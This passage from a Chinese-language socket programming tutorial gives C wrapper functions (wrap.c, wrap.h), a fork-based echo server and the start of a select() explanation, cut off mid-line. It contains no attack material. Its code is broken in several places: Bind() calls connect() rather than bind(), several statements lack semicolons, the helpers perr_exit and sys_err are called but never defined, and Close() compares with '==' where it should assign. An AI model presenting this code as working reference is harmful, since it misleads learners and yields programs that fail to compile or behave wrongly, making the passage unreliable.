class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wrap.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perr_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Accept</span><span class="params">(<span class="keyword">int</span> fd,struct sockaddr *sa,<span class="keyword">socklen_t</span> *salenptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">again:</span><br><span class="line"><span class="keyword">if</span>((n = accept(fd,sa,salenptr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((errno == ECONNABORTED) || (errno == EINTR))</span><br><span class="line"><span class="keyword">goto</span> again;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">perr_exit(<span class="string">"accept error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Bind</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">n = connect(fd,sa,salen)</span><br><span class="line"><span class="keyword">if</span>(n&lt;<span class="number">0</span>)&#123;</span><br><span class="line">perr_exit(<span class="string">"connect error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Socket</span><span class="params">(<span class="keyword">int</span> domain,<span class="keyword">int</span> type,<span class="keyword">int</span> protocol)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">n = socket(domain,type,protocol);</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Listen</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> backlog)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">n = listen(sockfd,backlog);</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"listen error"</span>);</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Connect</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">n = connect(fd,sa,salen);</span><br><span class="line"><span class="keyword">if</span>(n&lt;<span class="number">0</span>)&#123;</span><br><span class="line">perr_exit(<span class="string">"connect error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> n;</span><br><span class="line">again:</span><br><span class="line"><span class="keyword">if</span>((n = read(fd,ptr,nbytes)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(errno == EINTR)</span><br><span class="line"><span class="keyword">goto</span> again;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Write</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> n;</span><br><span class="line">again:</span><br><span class="line"><span class="keyword">if</span>((n = write(fd,ptr,nbytes)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(errno == EINTR)</span><br><span class="line"><span class="keyword">goto</span> again;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Close</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">if</span>((n == close(fd)) == <span class="number">-1</span>)</span><br><span class="line">perr_exit(<span class="string">"close error"</span>);</span><br><span class="line"><span class="keyword">return</span> n</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> Readn(<span class="keyword">int</span> fd,<span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">size_t</span> nleft;</span><br><span class="line"><span class="keyword">ssize_t</span> nread;</span><br><span class="line"><span class="keyword">char</span> *ptr;</span><br><span class="line"></span><br><span class="line">ptr = vptr;</span><br><span class="line">nleft = n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(nleft &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((nread = read(fd,ptr,nleft)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(errno == EINTR)</span><br><span class="line">nread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">nleft-= nread;</span><br><span class="line">ptr += nread;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n-nleft;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Writen</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> nleft;</span><br><span class="line"><span class="keyword">ssize_t</span> nwritten;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *ptr;</span><br><span class="line"></span><br><span class="line">ptr = vptr;</span><br><span class="line">nleft = n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(nleft &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((nwritten = write(fd,ptr,nleft)) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(nwritten &lt; <span class="number">0</span> &amp;&amp; errno == EINTR)</span><br><span class="line">nwritten = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">nleft -= nwritten;</span><br><span class="line">ptr += nwritten;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现自定义头文件<code>wrap.h</code>，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _WRAP_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WRAP_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">perr_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Accept</span><span class="params">(<span class="keyword">int</span> fd,struct sockaddr *sa,<span class="keyword">socklen_t</span> *salenptr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Bind</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Connect</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> struct sockaddr *sa,<span class="keyword">socklen_t</span> salen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Socket</span><span class="params">(<span class="keyword">int</span> domain,<span class="keyword">int</span> type,<span class="keyword">int</span> protocol)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Listen</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Write</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *ptr,<span class="keyword">size_t</span> nbytes)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Readn</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">Writen</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> <span class="keyword">void</span> *vptr,<span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>实现服务端<code>server.c</code>，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wrap.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">catch_child</span><span class="params">(<span class="keyword">int</span> signum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(waitpid(<span class="number">0</span>,<span class="literal">NULL</span>,WNOHANG) &gt; <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> lfd,cfd;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srv_addr</span>,<span class="title">clt_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clt_addr_len;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="keyword">int</span> ret,i;</span><br><span class="line"><span class="built_in">memset</span>(&amp;srv_addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line">srv_addr.sin_family = AF_INET;</span><br><span class="line">srv_addr.sin_port = htons(SRV_PORT);</span><br><span class="line">srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">lfd = Socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">Bind(lfd,(struct sockaddr *)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line"></span><br><span class="line">Listen(lfd,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">clt_addr_len = <span class="keyword">sizeof</span>(clt_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">cfd = Accept(lfd,(struct sockaddr *)&amp;clt_addr,&amp;clt_addr_len);</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">perr_err(<span class="string">"fork error"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">close(lfd);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">struct sigaction act;</span><br><span class="line">act.sa_handler = catch_child;</span><br><span class="line">sigemptyset(&amp;act.sa_mask);</span><br><span class="line">act.sa_flags = <span class="number">0</span>;</span><br><span class="line">ret = sigaction(SIGCHLD,&amp;act,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">perr_err(<span class="string">"sigaction error"</span>);</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line">ret = Read(cfd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">0</span>)&#123;</span><br><span class="line">close(cfd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;ret;i++)</span><br><span class="line">buf[i] = <span class="built_in">toupper</span>(buf[i]);</span><br><span class="line">write(cfd,buf,ret);</span><br><span class="line">write(STDOUT_FILENO,buf,ret);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>联合编译生成<code>server</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc server.c wrap.c -o server</span><br></pre></td></tr></table></figure><h4 id="多路IO转接"><a href="#多路IO转接" class="headerlink" title="多路IO转接"></a>多路IO转接</h4><h5 id="select"><a href="#select" class="headerlink" title="select"></a>select</h5><p>借助内核，select来监听客户端连接、数据通信事件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> nfds, fd_set *readfds, fd_set *writefds,</span></span></span><br><span class="line"><span class="function"><span class="params">         fd_set *exceptfds, struct timeval *timeout)</span></span>;</span><br><span class="line"></span><br><span class="line">nfds:监听的所有文件描述符中，最大文件文件描述符+<span class="number">1</span></span><br><span class="line">readfds:读文件描述符监听集合</span><br><span class="line">writefds:写文件描述符监听集合</span><br><span class="line">exceptfds:异常文件描述符监听集合</span><br><span class="line">timeout:</span><br><span class="line">&gt;<span class="number">0</span> : 设置监听超时时长</span><br><span class="line">  <span class="literal">NULL</span> : 阻塞监听</span><br><span class="line">  <span class="number">0</span> : 非阻塞监听，轮询</span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">    &gt;<span class="number">0</span> : 所有监听集合中，满足对应事件的总数</span><br><span class="line">    <span class="number">0</span> : 没有满足监听条件的文件描述符</span><br><span class="line">    <span class="number">-1</span> : errno</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_ZERO</span><span class="params">(fd_set *<span class="built_in">set</span>)</span> <span class="comment">//清空一个文件描述符集合</span></span></span><br><span class="line"><span class="function">  fd_set rset</span>;</span><br><span class="line">FD_ZERO(&amp;rset);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_SET</span><span class="params">(<span class="keyword">int</span> fd,fd_set *<span class="built_in">set</span>)</span> <span class="comment">//将待监听的文件描述符，添加到监听集合中</span></span></span><br><span class="line"><span class="function">  <span class="title">FD_SET</span><span class="params">(<span class="number">3</span>,&amp;rset)</span>   <span class="title">FD_SET</span><span class="params">(<span class="number">5</span>,&amp;rset)</span>   <span class="title">FD_SET</span><span class="params">(<span class="number">6</span>,&amp;rset)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_CLR</span><span class="params">(<span class="keyword">int</span> fd,fd_set *<span class="built_in">set</span>)</span>  <span class="comment">//将一个文件描述符从监听集合中移除</span></span></span><br><span class="line"><span class="function">  <span class="title">FD_CLR</span><span class="params">(<span class="number">4</span>,&amp;rset)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FD_ISSET</span><span class="params">(<span class="keyword">int</span> fd,fd_set *<span class="built_in">set</span>)</span> <span class="comment">//判断一个文件描述符是否在监听集合中</span></span></span><br><span class="line"><span class="function">  <span class="title">FD_ISSET</span><span class="params">(<span class="number">4</span>,&amp;rset)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="使用select实现多路IO转接"><a href="#使用select实现多路IO转接" class="headerlink" title="使用select实现多路IO转接"></a>使用select实现多路IO转接</h5><p><code>server</code>端代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wrap.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> listenfd,connfd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srv_addr</span>,<span class="title">clt_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clt_addr_len;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="keyword">int</span> opt = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;srv_addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line">srv_addr.sin_family = AF_INET;</span><br><span class="line">srv_addr.sin_port = htons(SRV_PORT);</span><br><span class="line">srv_addr.sin_addr.s_addr = 